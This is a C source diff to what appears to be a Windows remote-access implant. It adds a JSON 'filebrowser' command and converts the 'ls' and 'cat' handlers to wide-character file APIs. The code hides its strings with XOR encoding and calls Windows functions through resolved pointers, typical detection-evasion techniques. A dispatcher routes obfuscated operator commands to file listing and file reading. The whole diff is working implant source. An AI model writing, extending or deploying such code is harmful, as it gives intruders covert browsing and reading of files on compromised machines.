@@ -37,8 +37,11 @@ static void builtin_ls(const char *arg, char *out, int size) {
         }
     }
 
-    WIN32_FIND_DATAA fd;
-    HANDLE h = fnFindFirstFileA(pattern, &fd);
+    wchar_t wpattern[MAX_PATH];
+    fnMultiByteToWideChar(CP_UTF8, 0, pattern, -1, wpattern, MAX_PATH);
+
+    WIN32_FIND_DATAW fd;
+    HANDLE h = fnFindFirstFileW(wpattern, &fd);
     if (h == INVALID_HANDLE_VALUE) {
         char _ea[ENC_LS_ERR_ACCESS_LEN + 1]; xor_dec(_ea, ENC_LS_ERR_ACCESS, ENC_LS_ERR_ACCESS_LEN);
         _snprintf(out, size - 1, _ea, pattern, fnGetLastError());
@@ -46,19 +49,132 @@ static void builtin_ls(const char *arg, char *out, int size) {
     }
     char _td[ENC_LS_TAG_DIR_LEN + 1];  xor_dec(_td, ENC_LS_TAG_DIR,  ENC_LS_TAG_DIR_LEN);
     char _tf[ENC_LS_TAG_FILE_LEN + 1]; xor_dec(_tf, ENC_LS_TAG_FILE, ENC_LS_TAG_FILE_LEN);
-    char _dot[ENC_DOT_LEN + 1];        xor_dec(_dot,    ENC_DOT,    ENC_DOT_LEN);
-    char _dotdot[ENC_DOTDOT_LEN + 1];  xor_dec(_dotdot, ENC_DOTDOT, ENC_DOTDOT_LEN);
     int pos = 0;
     do {
-        if (strcmp(fd.cFileName, _dot) == 0 || strcmp(fd.cFileName, _dotdot) == 0)
+        if (fd.cFileName[0] == L'.' && (fd.cFileName[1] == L'\0' ||
+            (fd.cFileName[1] == L'.' && fd.cFileName[2] == L'\0')))
             continue;
         const char *tag = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? _td : _tf;
+        char utf8name[MAX_PATH * 4];
+        fnWideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, utf8name, sizeof(utf8name), NULL, NULL);
         char _rf[ENC_LS_ROW_FMT_LEN + 1]; xor_dec(_rf, ENC_LS_ROW_FMT, ENC_LS_ROW_FMT_LEN);
-        char line[512];
-        int n = _snprintf(line, sizeof(line) - 1, _rf, tag, fd.cFileName);
+        char line[1024];
+        int n = _snprintf(line, sizeof(line) - 1, _rf, tag, utf8name);
         if (n > 0 && pos + n < size - 1) { memcpy(out + pos, line, (size_t)n); pos += n; }
-    } while (fnFindNextFileA(h, &fd));
+    } while (fnFindNextFileW(h, &fd));
     fnFindClose(h);
+    out[pos] = '\0';
+}
+
+/* ------------------------------------------------------------------ */
+/* filebrowser (JSON output for file browser UI)                        */
+/* ------------------------------------------------------------------ */
+static void builtin_filebrowser(const char *arg, char *out, int size) {
+    if (size > 0) out[size - 1] = '\0';
+
+    /* Convert ANSI path arg to wide for FindFirstFileW */
+    wchar_t wpattern[MAX_PATH];
+    char pattern[MAX_PATH];
+    if (!arg || arg[0] == '\0') {
+        char _dw[ENC_DIR_WILDCARD_LEN + 1]; xor_dec(_dw, ENC_DIR_WILDCARD, ENC_DIR_WILDCARD_LEN);
+        _snprintf(pattern, sizeof(pattern) - 1, "%s", _dw);
+    } else {
+        size_t len = strlen(arg);
+        if (len == 0 || arg[len - 1] == '\\' || arg[len - 1] == '/') {
+            char _ds[ENC_DIR_FMT_STAR_LEN + 1]; xor_dec(_ds, ENC_DIR_FMT_STAR, ENC_DIR_FMT_STAR_LEN);
+            _snprintf(pattern, sizeof(pattern) - 1, _ds, arg);
+        } else if (strchr(arg, '*') || strchr(arg, '?'))
+            _snprintf(pattern, sizeof(pattern) - 1, "%s", arg);
+        else {
+            char _dbs[ENC_DIR_FMT_BSLASH_STAR_LEN + 1]; xor_dec(_dbs, ENC_DIR_FMT_BSLASH_STAR, ENC_DIR_FMT_BSLASH_STAR_LEN);
+            _snprintf(pattern, sizeof(pattern) - 1, _dbs, arg);
+        }
+    }
+    fnMultiByteToWideChar(CP_UTF8, 0, pattern, -1, wpattern, MAX_PATH);
+
+    WIN32_FIND_DATAW fd;
+    HANDLE h = fnFindFirstFileW(wpattern, &fd);
+    if (h == INVALID_HANDLE_VALUE) {
+        char esc_pat[MAX_PATH * 2];
+        int ep = 0;
+        for (int i = 0; pattern[i] && ep < (int)sizeof(esc_pat) - 2; i++) {
+            if (pattern[i] == '\\' || pattern[i] == '"') esc_pat[ep++] = '\\';
+            esc_pat[ep++] = pattern[i];
+        }
+        esc_pat[ep] = '\0';
+        char _fe[ENC_FB_ERR_LEN + 1]; xor_dec(_fe, ENC_FB_ERR, ENC_FB_ERR_LEN);
+        _snprintf(out, size - 1, _fe, esc_pat, fnGetLastError());
+        return;
+    }
+
+    char _td[ENC_FB_TYPE_DIR_LEN+1];  xor_dec(_td,     ENC_FB_TYPE_DIR,  ENC_FB_TYPE_DIR_LEN);
+    char _tf[ENC_FB_TYPE_FILE_LEN+1]; xor_dec(_tf,     ENC_FB_TYPE_FILE, ENC_FB_TYPE_FILE_LEN);
+    char _ef[ENC_FB_ENTRY_LEN + 1];   xor_dec(_ef,     ENC_FB_ENTRY,     ENC_FB_ENTRY_LEN);
+
+    int pos = 0;
+    out[pos++] = '[';
+    int first = 1;
+
+    do {
+        /* Skip . and .. */
+        if (fd.cFileName[0] == L'.' && (fd.cFileName[1] == L'\0' ||
+            (fd.cFileName[1] == L'.' && fd.cFileName[2] == L'\0')))
+            continue;
+
+        const char *type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? _td : _tf;
+
+        /* Build attrs string */
+        char attrs[8];
+        int ai = 0;
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) attrs[ai++] = 'D';
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)  attrs[ai++] = 'R';
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)    attrs[ai++] = 'H';
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)    attrs[ai++] = 'S';
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)   attrs[ai++] = 'A';
+        if (ai == 0) attrs[ai++] = '-';
+        attrs[ai] = '\0';
+
+        unsigned long long fsize = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
+
+        SYSTEMTIME st = {0};
+        fnFileTimeToSystemTime(&fd.ftLastWriteTime, &st);
+
+        /* Convert wide filename to UTF-8 */
+        char utf8name[MAX_PATH * 4];
+        int utf8len = fnWideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, utf8name, sizeof(utf8name), NULL, NULL);
+        if (utf8len <= 0) continue;
+
+        /* JSON-escape the UTF-8 filename */
+        char esc[MAX_PATH * 6];
+        int ei = 0;
+        for (int i = 0; utf8name[i] && ei < (int)sizeof(esc) - 7; i++) {
+            unsigned char ch = (unsigned char)utf8name[i];
+            if (ch == '"')       { esc[ei++] = '\\'; esc[ei++] = '"'; }
+            else if (ch == '\\') { esc[ei++] = '\\'; esc[ei++] = '\\'; }
+            else if (ch == '\n') { esc[ei++] = '\\'; esc[ei++] = 'n'; }
+            else if (ch == '\r') { esc[ei++] = '\\'; esc[ei++] = 'r'; }
+            else if (ch == '\t') { esc[ei++] = '\\'; esc[ei++] = 't'; }
+            else if (ch < 0x20)  { ei += _snprintf(esc + ei, 7, "\\u%04x", ch); }
+            else                 { esc[ei++] = (char)ch; }
+        }
+        esc[ei] = '\0';
+
+        char line[2048];
+        int n = _snprintf(line, sizeof(line) - 1, _ef,
+            esc, type, attrs, fsize,
+            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+        if (n > 0) {
+            int need = (first ? 0 : 1) + n;
+            if (pos + need < size - 2) {
+                if (!first) out[pos++] = ',';
+                memcpy(out + pos, line, (size_t)n);
+                pos += n;
+                first = 0;
+            }
+        }
+    } while (fnFindNextFileW(h, &fd));
+    fnFindClose(h);
+    out[pos++] = ']';
     out[pos] = '\0';
 }
 
@@ -109,7 +225,9 @@ static void builtin_cat(const char *path, char *out, int size) {
         char _cm[ENC_CAT_ERR_MISSING_LEN + 1]; xor_dec(_cm, ENC_CAT_ERR_MISSING, ENC_CAT_ERR_MISSING_LEN);
         _snprintf(out, size - 1, "%s", _cm); return;
     }
-    HANDLE h = fnCreateFileA2(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+    wchar_t wpath[MAX_PATH];
+    fnMultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH);
+    HANDLE h = fnCreateFileW2(wpath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (h == INVALID_HANDLE_VALUE) {
         char _co[ENC_CAT_ERR_OPEN_LEN + 1]; xor_dec(_co, ENC_CAT_ERR_OPEN, ENC_CAT_ERR_OPEN_LEN);
@@ -900,6 +1018,14 @@ int builtin_dispatch(const char *cmd, char *out_buf, int buf_size) {
         if      (xor_prefix(cmd, ENC_CMD_LS_SP,  ENC_CMD_LS_SP_LEN))  arg = cmd + ENC_CMD_LS_SP_LEN;
         else if (xor_prefix(cmd, ENC_CMD_DIR_SP, ENC_CMD_DIR_SP_LEN)) arg = cmd + ENC_CMD_DIR_SP_LEN;
         builtin_ls(arg, out_buf, buf_size);
+        return 1;
+    }
+    if (xor_eq(cmd, ENC_CMD_FILEBROWSER_BARE, ENC_CMD_FILEBROWSER_BARE_LEN)) {
+        builtin_filebrowser("", out_buf, buf_size);
+        return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_FILEBROWSER, ENC_CMD_FILEBROWSER_LEN)) {
+        builtin_filebrowser(cmd + ENC_CMD_FILEBROWSER_LEN, out_buf, buf_size);
         return 1;
     }
     if (xor_prefix(cmd, ENC_CMD_CAT, ENC_CMD_CAT_LEN)) {
